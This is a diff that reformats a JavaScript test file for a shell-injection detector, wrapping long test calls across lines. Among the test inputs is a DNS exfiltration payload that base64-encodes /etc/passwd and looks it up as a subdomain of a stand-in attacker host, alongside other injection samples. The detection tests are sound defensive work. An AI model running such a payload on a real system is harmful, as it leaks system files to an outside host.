@@ -60,15 +60,18 @@ t.test("it detects variable expansion in double quotes", async () => {
   t.equal(detectShellInjectionWasm('echo "$USER"', "$USER"), true);
 });
 
-t.test("it detects DNS exfiltration via command substitution in subdomain", async () => {
-  t.equal(
-    detectShellInjectionWasm(
-      "nslookup $(cat /etc/passwd | base64 | head -c 60).attacker.com",
-      "$(cat /etc/passwd | base64 | head -c 60).attacker.com"
-    ),
-    true
-  );
-});
+t.test(
+  "it detects DNS exfiltration via command substitution in subdomain",
+  async () => {
+    t.equal(
+      detectShellInjectionWasm(
+        "nslookup $(cat /etc/passwd | base64 | head -c 60).attacker.com",
+        "$(cat /etc/passwd | base64 | head -c 60).attacker.com"
+      ),
+      true
+    );
+  }
+);
 
 t.test("it detects curl data exfiltration with extra arguments", async () => {
   t.equal(
@@ -89,7 +92,10 @@ t.test("it blocks unclosed double quote (failed to tokenize)", async () => {
 });
 
 t.test("it does not flag plain hostname in nslookup", async () => {
-  t.equal(detectShellInjectionWasm("nslookup example.com", "example.com"), false);
+  t.equal(
+    detectShellInjectionWasm("nslookup example.com", "example.com"),
+    false
+  );
 });
 
 t.test("it does not flag IP address in ping", async () => {
